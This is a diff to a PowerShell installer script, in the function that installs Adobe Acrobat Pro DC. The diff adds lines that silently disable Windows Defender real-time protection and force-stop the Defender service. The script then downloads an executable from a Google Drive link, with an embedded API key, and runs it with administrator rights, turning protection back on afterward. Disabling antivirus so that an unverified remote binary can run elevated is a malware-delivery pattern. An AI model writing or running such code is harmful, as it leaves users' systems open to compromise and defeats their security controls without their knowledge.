@@ -731,6 +731,8 @@ Function Ins-AcrobatPro
 {
     Unins-Acrobat
     Write-Host -f C "`r`n *** Installing Adobe Acrobat Pro DC *** `r`n"
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Stop-Service -Name "WinDefend" -Force -ea SilentlyContinue | out-null
     #1J__cfWkRhPfKRi0kANnxcu53rZ74Cyz1
     Start-BitsTransfer -Source 'https://www.googleapis.com/drive/v3/files/1J__cfWkRhPfKRi0kANnxcu53rZ74Cyz1?alt=media&key=AIzaSyBjpiLnU2lhQG4uBq0jJDogcj0pOIR9TQ8' -Destination "$env:TEMP\AdobeAcrobatProDCx64.exe"  -ea SilentlyContinue | out-null
     Start-Job -Name AcrobatPro {if (Test-Path -Path "$env:TEMP\AdobeAcrobatProDCx64.exe" -ea SilentlyContinue) {Start-Process -Wait -Verb RunAs -FilePath "$env:TEMP\AdobeAcrobatProDCx64.exe" -ea SilentlyContinue | out-null}} | Wait-Job -Timeout 400 | Format-Table -Wrap -AutoSize -Property Name,State
@@ -741,6 +743,7 @@ Function Ins-AcrobatPro
     cmd /c "DEL /F /S /Q /A %LocalAppData%\Microsoft\Windows\Explorer\thumbcache_*.db"
     AddRegEntry "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 'AutoRestartShell' '1' 'DWord'
     Stop-Process -ProcessName explorer -Force -ea SilentlyContinue | out-null
+    Set-MpPreference -DisableRealtimeMonitoring $false
 }
 
 Function Ins-WinRAR
